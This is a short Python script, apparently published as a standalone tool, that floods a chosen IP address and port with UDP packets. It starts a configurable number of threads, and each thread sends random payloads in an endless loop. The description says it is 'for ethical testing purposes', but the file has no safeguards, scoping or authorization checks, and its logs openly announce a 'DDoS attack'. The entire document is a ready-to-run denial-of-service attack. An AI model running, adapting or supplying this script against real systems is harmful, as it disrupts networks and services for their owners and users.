import socket
import random
import threading
import argparse
import logging

__author__ = "Hydr0cher"
__version__ = "1.0"
__copyright__ = "Copyright (C) 2024 Hydr0cher. All rights reserved."
__license__ = "MIT License"

# Function to parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="Simple DDoS script for ethical testing purposes.")
    parser.add_argument("target_ip", type=str, help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of attacking threads (default: 10)")
    parser.add_argument("-s", "--size", type=int, default=1024, help="Size of packet payload (default: 1024 bytes)")
    return parser.parse_args()

# Function to send UDP packets to the target
def ddos(target_ip, target_port, packet_size):
    while True:
        try:
            # Create a socket and connect to the target
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target_ip, target_port))

            # Generate a random payload
            payload = random._urandom(packet_size)

            # Send the packet to the target
            s.send(payload)
            
            # Close the socket
            s.close()
            logging.info(f"Packet sent to {target_ip}:{target_port} with size {packet_size}")
        except socket.error as e:
            logging.error(f"Socket error: {e}")
        except Exception as e:
            logging.error(f"Error: {e}")

# Main function
def main():
    # Configure logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # Parse command-line arguments
    args = parse_arguments()

    # Log the start of the attack
    logging.info(f"Starting DDoS attack on {args.target_ip}:{args.target_port} with {args.threads} threads and {args.size} byte payloads")

    # Start attacking threads
    thread_list = []
    try:
        for i in range(args.threads):
            thread = threading.Thread(target=ddos, args=(args.target_ip, args.target_port, args.size))
            thread_list.append(thread)
            thread.start()
            logging.info(f"Thread {i+1} started")

        # Wait for all threads to complete
        for thread in thread_list:
            thread.join()

    except KeyboardInterrupt:
        logging.info("Attack interrupted. Exiting...")

if __name__ == "__main__":
    main()
